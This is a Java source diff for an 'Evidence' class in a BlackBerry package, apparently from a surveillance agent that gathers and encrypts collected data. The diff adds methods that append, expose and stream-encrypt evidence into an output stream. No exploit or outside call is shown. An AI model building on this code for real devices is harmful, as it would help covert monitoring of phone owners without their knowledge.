@@ -8,8 +8,10 @@
  * *************************************************/
 package blackberry.evidence;
 
+import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.util.Date;
 import java.util.Vector;
 
@@ -440,6 +442,10 @@ public final class Evidence {
         return buffer;
     }
 
+    public boolean appendEvidence(final byte[] data) {
+        return writeEvidence(data, 0);
+    }
+
     public boolean writeEvidence(final byte[] data) {
         return writeEvidence(data, 0);
     }
@@ -503,10 +509,6 @@ public final class Evidence {
         return true;
     }
 
-    public byte[] getEncData() {
-        return encData;
-    }
-
     /**
      * Write logs.
      * 
@@ -535,6 +537,14 @@ public final class Evidence {
         //#endif
 
         return writeEvidence(buffer);
+    }
+
+    public byte[] getEncData() {
+        return encData;
+    }
+
+    public DataOutputStream getOutputStream() {
+        return os;
     }
 
     // pubblico solo per fare i test
@@ -646,6 +656,19 @@ public final class Evidence {
         createEvidence(null, force);
         writeEvidence(WChar.getBytes(message, true));
         close();
+    }
+
+    public void writeEvidence(DataInputStream inputStream, int size) {
+        try {
+            os.write(Utils.intToByteArray(size));
+            encryption.encryptData(inputStream, os);
+            os.close();
+        } catch (IOException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("writeEvidence");
+            //#endif
+        }
     }
 
 }
